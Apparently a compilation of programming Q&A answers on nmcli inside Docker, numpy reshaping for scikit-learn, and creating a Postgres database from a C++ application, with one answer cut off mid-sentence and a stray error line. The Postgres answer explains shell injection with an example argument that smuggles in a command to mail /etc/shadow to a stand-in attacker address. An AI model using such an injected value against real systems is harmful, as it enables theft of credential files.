Q: Network Interface Configuration (inside docker) A:

You can't run nmcli from inside Docker. It tries to manage the host networking environment, but Docker generally manages the network environment for you. A container also won't be running the NetworkManager daemon and so nmcli will have nothing to talk to.

Just in general I'd try hard to avoid managing the host network environment from inside a program: it's not a standard pattern, every Linux distribution will do it differently (NetworkManager is not universally available), it's not something I'd expect as a normal user, a

assertion failed: write() returned -1: ECONNRESET

Q: How to fix ValueError: Found array with 0 sample(s) A:

When you do:

X = np.array(X).reshape((1,-1))
Y = np.array(Y).reshape((1,-1))

You are transforming your lists (of length N) into a 1xN array (i.e. one row, N columns). But then, when you split your dataset, you do:

X_train = X[:-250]

Which tries to select all the rows until row N-250. But since there is only one row, it puts a 0xN array into X_train. The LinearRegressionModel doesn't like that.

What you want to do is to get Nx1 arrays. With reshape, the -1 corresponds to "try to fill this dimension with whatever fits given the other constraints". So if you want N rows and 1 column, you need:

X = np.array(X).reshape((-1, 1))
Y = np.array(Y).reshape((-1, 1))

Alternatively, if you want to be more explicit about what you're doing (which is adding a new axis to the array), you can do:

X = np.array(X)[:, np.newaxis]
Y = np.array(Y)[:, np.newaxis]

Finally, your last line:

print( str(round(regressIt.predict(Y))) )

Will not work. The result of predict is a numpy array, and to round a numpy array you should use the np.round method. Also there is no need to cast to str, as that will be done automatically by print. So this would give:

print(np.round(regressIt.predict(Y)))

You need to install the SQL Compact MSI on the server, download from here: http://www.microsoft.com/en-us/download/details.aspx?id=30709

Q: Create a Postgres database automatically from within an application A:

Is this even a good idea?

Not really. If you can call initdb and createuser then you have unrestricted access to any other database running on the system, and potentially root-level permissions on the whole system, and you'd want to avoid that.

Databases also have particular needs: they are disk I/O heavy and need a lot of storage and can be a bottleneck for an application (or multiple applications). It's not uncommon to run a database on dedicated hardware, and if the database isn't on the local system then these commands won't work. In a cloud environment, it's easy to get a managed database (for example in AWS RDS) where the cloud provider manages snapshots and backups and upgrades, and again these commands just won't be possible in that environment.

On this particular code:

std::system(std::format(...))

This is a significant security issue (a shell injection vulnerability) and you should never use string interpolation to construct a command line. This is doubly true if your application needs elevated privileges to create a database. For example, if a caller was able to run

./my-app --parent-directory '; cat /etc/shadow | mail badguy@example.com;'

that string will be dutifully inserted into the string passed to std::system(), which passes it through a shell, which in turn will mail out your encrypted password file to a hacker with an offline password cracker.

The generic advice here is to always use a path that creates a command using a list of words; in Python for example subprocess.run(["initdb", "-D", str(parent_directory / "database" / "cluster")]) is safe even if parent_directory contains shell-unsafe characters. There doesn't seem to be an easy way to do this in C++ from what I can tell, see for example C++ best way to launch another process? On Unix-like systems you can use the lower-level C fork(2) and execve(2) (or execl(3)) functions but they're pretty manual, see for example Linux: Executing child process with piped stdin/stdout which shows the pattern (along with some pipe(2) calls you don't necessarily need).
